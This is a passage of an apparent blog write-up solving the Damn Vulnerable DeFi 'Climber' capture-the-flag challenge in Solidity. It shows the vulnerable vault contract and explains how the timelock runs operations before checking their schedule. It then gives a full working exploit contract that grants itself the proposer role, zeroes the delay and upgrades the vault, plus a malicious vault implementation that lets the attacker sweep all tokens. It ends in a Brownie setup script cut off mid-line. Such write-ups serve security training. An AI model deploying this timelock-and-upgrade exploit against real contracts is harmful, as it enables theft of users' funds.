class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./ClimberTimelock.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">ClimberVault</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ClimberVault</span> is <span class="title class_">Initializable</span>, <span class="title class_">OwnableUpgradeable</span>, <span class="title class_">UUPSUpgradeable</span> &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public constant <span class="variable constant_">WITHDRAWAL_LIMIT</span> = <span class="number">1</span> ether;</span><br><span class="line">    uint256 public constant <span class="variable constant_">WAITING_PERIOD</span> = <span class="number">15</span> days;</span><br><span class="line"></span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlySweeper</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == _sweeper, <span class="string">&quot;Caller must be sweeper&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @custom:oz-upgrades-unsafe-allow constructor</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) initializer &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">initialize</span>(<span class="params">address admin, address proposer, address sweeper</span>) initializer external &#123;</span><br><span class="line">        <span class="comment">// Initialize inheritance chain</span></span><br><span class="line">        <span class="title function_">__Ownable_init</span>();</span><br><span class="line">        <span class="title function_">__UUPSUpgradeable_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Deploy timelock and transfer ownership to it</span></span><br><span class="line">        <span class="title function_">transferOwnership</span>(<span class="title function_">address</span>(<span class="keyword">new</span> <span class="title class_">ClimberTimelock</span>(admin, proposer)));</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_setSweeper</span>(sweeper);</span><br><span class="line">        <span class="title function_">_setLastWithdrawal</span>(block.<span class="property">timestamp</span>);</span><br><span class="line">        _lastWithdrawalTimestamp = block.<span class="property">timestamp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows the owner to send a limited amount of tokens to a recipient every now and then</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">address tokenAddress, address recipient, uint256 amount</span>) external onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &lt;= <span class="variable constant_">WITHDRAWAL_LIMIT</span>, <span class="string">&quot;Withdrawing too much&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">timestamp</span> &gt; _lastWithdrawalTimestamp + <span class="variable constant_">WAITING_PERIOD</span>, <span class="string">&quot;Try later&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">_setLastWithdrawal</span>(block.<span class="property">timestamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IERC20</span> token = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(recipient, amount), <span class="string">&quot;Transfer failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows trusted sweeper account to retrieve any tokens</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sweepFunds</span>(<span class="params">address tokenAddress</span>) external onlySweeper &#123;</span><br><span class="line">        <span class="title class_">IERC20</span> token = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(_sweeper, token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))), <span class="string">&quot;Transfer failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getSweeper</span>(<span class="params"></span>) external view returns (address) &#123;</span><br><span class="line">        <span class="keyword">return</span> _sweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setSweeper</span>(<span class="params">address newSweeper</span>) internal &#123;</span><br><span class="line">        _sweeper = newSweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastWithdrawalTimestamp</span>(<span class="params"></span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> _lastWithdrawalTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setLastWithdrawal</span>(<span class="params">uint256 timestamp</span>) internal &#123;</span><br><span class="line">        _lastWithdrawalTimestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_authorizeUpgrade</span>(<span class="params">address newImplementation</span>) internal onlyOwner override &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Our goal is to steal all the tokens from <code>climberVault</code>. This will be easy if we access the <code>sweepFunds()</code> function. To get that, we need to be the owner. So we need to upgrade the contract to our custom contract and execute the <code>sweepFunds()</code> function. If we look at the <code>climberTimelock</code> contract, it allows us to execute the code so that we can execute the <code>_authorizeUpgrade()</code> function. Since this contract is the owner, it can execute the function. However, to schedule our operations in the <code>climberTimelock</code> contract, we need to have a <code>Proposer</code> role, however inside the <code>execute()</code> function, the contract first executes the given operations and then check if the operations are scheduled, so if we give one of the operations to execute the <code>schedule()</code> function and make the <code>delay</code> to <code>0</code> by executing <code>UpdateDelay()</code> function now our operations are scheduled. They are valid, so now we can execute the <code>_authorizeUpgrade()</code> function to our <code>MaliciousClimberVault</code>, which sets the attacker as sweeper, and the attacker can execute <code>sweepFunds()</code> to steal all the tokens.</p>
<ul>
<li>This solution is partly taken from <a target="_blank" rel="noopener" href="https://github.com/nahueldsanchez/dvd_brownie">this-repository</a> since I’m unable to run the challenge in my environment.</li>
</ul>
<h3 id="climber-Exploit-sol"><a href="#climber-Exploit-sol" class="headerlink" title="climber_Exploit.sol"></a>climber_Exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNDEFINED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IClimberTimeLock</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">updateDelay</span>(<span class="params">uint64 newDelay</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">grantRole</span>(<span class="params">bytes32 role, address account</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">schedule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] calldata targets,</span></span><br><span class="line"><span class="params">        uint256[] calldata values,</span></span><br><span class="line"><span class="params">        bytes[] calldata dataElements,</span></span><br><span class="line"><span class="params">        bytes32 salt</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] calldata targets,</span></span><br><span class="line"><span class="params">        uint256[] calldata values,</span></span><br><span class="line"><span class="params">        bytes[] calldata dataElements,</span></span><br><span class="line"><span class="params">        bytes32 salt</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract climber_Exploit &#123;</span><br><span class="line">    address victimAddress;</span><br><span class="line">    address vaultAddress;</span><br><span class="line">    address maliciousContract;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="comment">// bytes32 public constant PROPOSER_ROLE = keccak256(&quot;PROPOSER_ROLE&quot;);</span></span><br><span class="line">    bytes32 public constant <span class="variable constant_">PROPOSER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;PROPOSER_ROLE&quot;</span>);</span><br><span class="line">    bool alreadyScheduled = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _vaulTimeLock,</span></span><br><span class="line"><span class="params">        address _vault,</span></span><br><span class="line"><span class="params">        address _maliciousContract</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        victimAddress = _vaulTimeLock;</span><br><span class="line">        vaultAddress = _vault;</span><br><span class="line">        maliciousContract = _maliciousContract;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        address[] memory targets = <span class="keyword">new</span> address[](<span class="number">4</span>);</span><br><span class="line">        targets[<span class="number">0</span>] = victimAddress;</span><br><span class="line">        targets[<span class="number">1</span>] = victimAddress;</span><br><span class="line">        targets[<span class="number">2</span>] = vaultAddress;</span><br><span class="line">        targets[<span class="number">3</span>] = <span class="title function_">address</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">        uint256[] memory values = <span class="keyword">new</span> uint256[](<span class="number">4</span>);</span><br><span class="line">        values[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        bytes[] memory data = <span class="keyword">new</span> bytes[](<span class="number">4</span>);</span><br><span class="line">        bytes memory updateDelayData = abi.<span class="title function_">encodeWithSelector</span>(<span class="number">0x24adbc5b</span>, <span class="number">0</span>);</span><br><span class="line">        bytes memory grantRoleData = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            <span class="number">0x2f2ff15d</span>,</span><br><span class="line">            <span class="variable constant_">PROPOSER_ROLE</span>,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>)</span><br><span class="line">        );</span><br><span class="line">        bytes memory upgradeData = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            <span class="number">0x3659cfe6</span>,</span><br><span class="line">            maliciousContract</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        bytes memory schedule = abi.<span class="title function_">encodeWithSelector</span>(<span class="number">0x0045ef3e</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        data[<span class="number">0</span>] = updateDelayData;</span><br><span class="line">        data[<span class="number">1</span>] = grantRoleData;</span><br><span class="line">        data[<span class="number">2</span>] = upgradeData;</span><br><span class="line">        data[<span class="number">3</span>] = schedule;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IClimberTimeLock</span>(victimAddress).<span class="title function_">execute</span>(targets, values, data, <span class="number">0x00</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_schedule</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        address[] memory targets = <span class="keyword">new</span> address[](<span class="number">4</span>);</span><br><span class="line">        targets[<span class="number">0</span>] = victimAddress;</span><br><span class="line">        targets[<span class="number">1</span>] = victimAddress;</span><br><span class="line">        targets[<span class="number">2</span>] = vaultAddress;</span><br><span class="line">        targets[<span class="number">3</span>] = <span class="title function_">address</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line">        uint256[] memory values = <span class="keyword">new</span> uint256[](<span class="number">4</span>);</span><br><span class="line">        values[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        values[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        bytes[] memory data = <span class="keyword">new</span> bytes[](<span class="number">4</span>);</span><br><span class="line">        bytes memory updateDelayData = abi.<span class="title function_">encodeWithSelector</span>(<span class="number">0x24adbc5b</span>, <span class="number">0</span>);</span><br><span class="line">        bytes memory grantRoleData = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            <span class="number">0x2f2ff15d</span>,</span><br><span class="line">            <span class="variable constant_">PROPOSER_ROLE</span>,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>)</span><br><span class="line">        );</span><br><span class="line">        bytes memory upgradeData = abi.<span class="title function_">encodeWithSelector</span>(</span><br><span class="line">            <span class="number">0x3659cfe6</span>,</span><br><span class="line">            maliciousContract</span><br><span class="line">        );</span><br><span class="line">        bytes memory schedule = abi.<span class="title function_">encodeWithSelector</span>(<span class="number">0x0045ef3e</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        data[<span class="number">0</span>] = updateDelayData;</span><br><span class="line">        data[<span class="number">1</span>] = grantRoleData;</span><br><span class="line">        data[<span class="number">2</span>] = upgradeData;</span><br><span class="line">        data[<span class="number">3</span>] = schedule;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IClimberTimeLock</span>(victimAddress).<span class="title function_">schedule</span>(targets, values, data, <span class="number">0x00</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MaliciousClimberVault-sol"><a href="#MaliciousClimberVault-sol" class="headerlink" title="MaliciousClimberVault.sol"></a>MaliciousClimberVault.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import &quot;@openzeppelin/contracts/proxy/utils/Initializable.sol&quot;;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts-upgradeable/contracts/access/OwnableUpgradeable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts-upgradeable/contracts/token/ERC20/IERC20Upgradeable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../ClimberTimelock.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MaliciousClimberVault</span> is</span><br><span class="line">    <span class="title class_">Initializable</span>,</span><br><span class="line">    <span class="title class_">OwnableUpgradeable</span>,</span><br><span class="line">    <span class="title class_">UUPSUpgradeable</span></span><br><span class="line">&#123;</span><br><span class="line">    uint256 public constant <span class="variable constant_">WITHDRAWAL_LIMIT</span> = <span class="number">0</span>;</span><br><span class="line">    uint256 public constant <span class="variable constant_">WAITING_PERIOD</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlySweeper</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == _sweeper, <span class="string">&quot;Caller must be sweeper&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @custom:oz-upgrades-unsafe-allow constructor</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) initializer &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">initialize</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address admin,</span></span><br><span class="line"><span class="params">        address proposer,</span></span><br><span class="line"><span class="params">        address sweeper</span></span><br><span class="line"><span class="params">    </span>) external initializer &#123;</span><br><span class="line">        <span class="comment">// Initialize inheritance chain</span></span><br><span class="line">        <span class="title function_">__Ownable_init</span>();</span><br><span class="line">        <span class="comment">// __UUPSUpgradeable_init();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Deploy timelock and transfer ownership to it</span></span><br><span class="line">        <span class="comment">//transferOwnership(address(new ClimberTimelock(admin, proposer)));</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_">_setSweeper</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setLastWithdrawal</span>(block.<span class="property">timestamp</span>);</span><br><span class="line">        _lastWithdrawalTimestamp = block.<span class="property">timestamp</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows the owner to send a limited amount of tokens to a recipient every now and then</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address tokenAddress,</span></span><br><span class="line"><span class="params">        address recipient,</span></span><br><span class="line"><span class="params">        uint256 amount</span></span><br><span class="line"><span class="params">    </span>) external onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &lt;= <span class="variable constant_">WITHDRAWAL_LIMIT</span>, <span class="string">&quot;Withdrawing too much&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            block.<span class="property">timestamp</span> &gt; _lastWithdrawalTimestamp + <span class="variable constant_">WAITING_PERIOD</span>,</span><br><span class="line">            <span class="string">&quot;Try later&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_setLastWithdrawal</span>(block.<span class="property">timestamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IERC20Upgradeable</span> token = <span class="title class_">IERC20Upgradeable</span>(tokenAddress);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(recipient, amount), <span class="string">&quot;Transfer failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allows trusted sweeper account to retrieve any tokens</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sweepFunds</span>(<span class="params">address tokenAddress</span>) external onlySweeper &#123;</span><br><span class="line">        <span class="title class_">IERC20Upgradeable</span> token = <span class="title class_">IERC20Upgradeable</span>(tokenAddress);</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            token.<span class="title function_">transfer</span>(_sweeper, token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))),</span><br><span class="line">            <span class="string">&quot;Transfer failed&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getSweeper</span>(<span class="params"></span>) external view returns (address) &#123;</span><br><span class="line">        <span class="keyword">return</span> _sweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setSweeper</span>(<span class="params">address newSweeper</span>) public &#123;</span><br><span class="line">        _sweeper = newSweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLastWithdrawalTimestamp</span>(<span class="params"></span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> _lastWithdrawalTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_setLastWithdrawal</span>(<span class="params">uint256 timestamp</span>) internal &#123;</span><br><span class="line">        _lastWithdrawalTimestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_authorizeUpgrade</span>(<span class="params">address newImplementation</span>)</span><br><span class="line">        internal</span><br><span class="line">        override</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="climber-py"><a href="#climber-py" class="headerlink" title="climber.py"></a>climber.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> accounts, Contract, ClimberTimelock, ClimberVault, DamnValuableToken, ERC1967Proxy, ZERO_ADDRESS, climber_Exploit, MaliciousClimberVault, chain</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">VAULT_TOKEN_BALANCE = <span class="string">&#x27;10000000 ether&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scenario_setup</span>():</span><br><span class="line"></span><br><span class="line">    ATTACKER_ACCOUNT = accounts.add()</span><br><span class="line">    PROPOSER_ACCOUNT = accounts.add()</span><br><span class="line">    SWEEPER_ACCOUNT = accounts.add()</span><br><span class="line"></span><br><span class="line">    accounts[<span class="number">0</span>].transfer(ATTACKER_ACCOUNT, <span class="string">&#x27;0.1 ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> ATTACKER_ACCOUNT.balance() == <span class="string">&#x27;0.1 ether&#x27;</span></span><br><span class="line"></span><br><span class="line">    climber_vault_implementation = ClimberVault.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    climber_vault_data = climber_vault_implementation.initialize.encode_input(</span><br><span class="line">        accounts[<span class="number">0</span>], PROPOSER_ACCOUNT, SWEEPER_ACCOUNT)</span><br><span class="line">    climber_vault_proxy = ERC1967Proxy.deploy(</span><br><span class="line">        climber_vault_implementation, climber_vault_data, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span 